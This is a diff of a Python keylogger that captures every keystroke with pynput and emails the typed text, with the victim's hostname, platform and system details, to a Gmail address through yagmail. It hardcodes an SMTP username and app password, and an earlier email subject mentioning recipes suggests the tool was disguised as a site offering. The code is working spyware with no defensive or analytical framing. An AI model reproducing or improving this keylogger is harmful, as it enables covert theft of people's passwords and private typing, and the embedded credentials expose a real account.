@@ -1,11 +1,12 @@
 import pynput
 from pynput.keyboard import Listener, Key
-import socket
+import socket as s
 import email
 import yagmail
 import datetime as dt
+import platform as p
 
-today=dt.datetime.now().strftime('%Y-%m-%d %H:%M')
+today=dt.datetime.now().strftime('%Y-%m-%d at %H:%M')
 r=('\n')*4
 
 class Email:
@@ -15,7 +16,11 @@ class Email:
     def send_email(self,testo):
         self.testo=testo
         email= yagmail.SMTP(user='dariojava99', password='peqhxybjekikvqjn')
-        email.send(to=self.email, subject='Thanks to use my site, these are the recipes!', contents=self.testo+r+today)
+        email.send(to=self.email, subject= "Here's what " + s.gethostname() + " typed", 
+                    contents=self.testo +"\n"+
+                    r+str(p.platform())+"\n" +
+                    str(p.uname()) + "\n" +
+                    today)
 
 
 sendemail = Email("a.rotili94@gmail.com")
@@ -31,14 +36,14 @@ def press(key):
         TestoEmail.testo +=" "
     elif key == Key.enter:
         TestoEmail.testo += "\n" 
-        sendemail.send_email(TestoEmail.testo.replace("'","")) 
     elif key == Key.shift:
-        TestoEmail.testo += ""      
+        TestoEmail.testo += "" 
+    elif key == Key.backspace:
+        TestoEmail.testo = TestoEmail.testo[:-2]       
     else:    
         TestoEmail.testo += TestoEmail.aggiungiStringa(str(key))  
     print(key)
-    
-    #s.send(str(key).encode())
+
 
 def release(key):
     if key == Key.esc:
